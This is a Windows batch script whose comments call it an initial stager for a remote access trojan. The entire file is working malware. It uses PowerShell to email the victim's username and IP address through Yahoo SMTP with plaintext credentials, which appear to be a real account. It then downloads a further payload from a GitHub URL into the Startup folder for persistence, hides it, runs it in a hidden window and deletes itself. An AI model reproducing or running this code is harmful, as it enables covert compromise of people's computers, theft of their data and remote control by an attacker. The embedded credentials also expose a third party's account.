@echo off
REM initial stager for RAT 
REM created by: CHEPHYTY
REM move into startup directory

REM variables 
REM INITIALPATH capture the current path of the dir
set "INITIALPATH=%cd%"
REM STARTUP capture the path of the Microsoft startup file
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM move into startup directory
cd /d "%STARTUP%"

REM setup SMTP
powershell -Command ^
    "$email = 'soumyahembra123@yahoo.com';" ^
    "$password = 'Soumya@2002';" ^
    "$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress;" ^
    "$subject = '$env:UserName logs';" ^
    "$smtp = New-Object System.Net.Mail.SmtpClient('smtp.mail.yahoo.com', 587);" ^
    "$smtp.EnableSsl = $true;" ^
    "$smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);" ^
    "$smtp.Send($email, $email, $subject, $ip)"

REM write payloads to startup
powershell -Command ^
    "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wget.cmd' -OutFile 'wget.cmd'; } catch { Write-Error 'An error occurred: ' + $_.Exception.Message; }"

REM hide the wget.cmd file
attrib +h wget.cmd

REM run payload
powershell -Command "Start-Process 'cmd.exe' -ArgumentList '/c wget.cmd' -WindowStyle Hidden"

REM cd back into initial location
cd /d "%INITIALPATH%"

REM self-delete without error message
start /b "" cmd /c del "%~f0"&exit
